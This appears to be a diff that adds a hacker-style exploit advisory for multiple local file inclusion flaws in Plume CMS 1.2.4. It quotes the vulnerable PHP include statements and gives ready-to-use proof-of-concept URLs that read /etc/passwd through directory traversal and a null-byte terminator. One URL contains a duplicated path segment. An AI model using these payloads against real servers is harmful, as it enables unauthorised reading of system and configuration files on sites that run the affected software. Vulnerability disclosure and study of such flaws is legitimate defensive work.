@@ -1,0 +1,70 @@
+########################################################
+Plume CMS 1.2.4 Multiple Local File Inclusion Vulnerabilities
+########################################################
+
+[+]Title:	Plume CMS 1.2.4 Multiple Local File Inclusion Vulnerabilities
+[+]Version:	1.2.4 (other or lower version may be also affected)
+[+]Download:	http://sourceforge.net/projects/pxsystem/files/
+[+]Author:	eidelweiss
+[+]Contact:	eidelweiss[at]cyberservices[dot]com		
+
+	[!]Thank`s To: All Friends & All Hackers
+
+########################################################
+Description:
+Plume CMS is a fully functional Content Management System in PHP on top of MySQL. 
+Including articles, news, file management and all of the general functionalities of a CMS. 
+It is completely accessible and very easy to use on a daily basis. 
+########################################################
+
+	-=[ Vuln C0de ]=-
+
+[-] plume/manager/articles.php
+**********************
+require_once 'path.php';
+require_once $_PX_config['manager_path'].'/prepend.php';
+require_once $_PX_config['manager_path'].'/inc/class.article.php';	// <= line 26
+
+**********************
+[-] plume/manager/tools.php
+**********************
+# On fait la liste des plugins
+$plugins_root = dirname(__FILE__).'/tools/';
+
+$objPlugins = new plugins($plugins_root);
+$plugins_list = $objPlugins->getPlugins();
+
+$include = '';
+
+if (!empty($_REQUEST['p']) && !empty($plugins_list[$_REQUEST['p']])
+    && $plugins_list[$_REQUEST['p']]['active']) {
+	$px_submenu->addItem(__('Back to the tools'), 'tools.php',
+                         'themes/'.$_px_theme.'/images/ico_back.png',
+                         false);
+	$p = $_REQUEST['p'];
+	$_px_ptheme = $m->user->getPluginTheme($p);
+	ob_start();
+	include $plugins_root.$p.'/index.php'; 	// <= line 54
+	$include = ob_get_contents();
+**********************
+[-] plume/manager/news.php
+
+require_once 'path.php';
+require_once $_PX_config['manager_path'].'/prepend.php';
+require_once $_PX_config['manager_path'].'/inc/class.news.php';
+
+**********************
+
+
+	-=[ Proof Of Concept ]=-
+
+	http://127.0.0.1/plume/manager/articles.php?_PX_config[manager_path]=../../../../../../etc/passwd%00
+
+	http://127.0.0.1/plume/manager/tools.php?p=../../../../../../etc/passwd%00
+
+	http://127.0.0.1/plume/manager/plume/manager/news.php?_PX_config[manager_path]=../../../../../../etc/passwd%00
+
+	etc , etc , etc.
+
+####################=[E0F]=####################
+
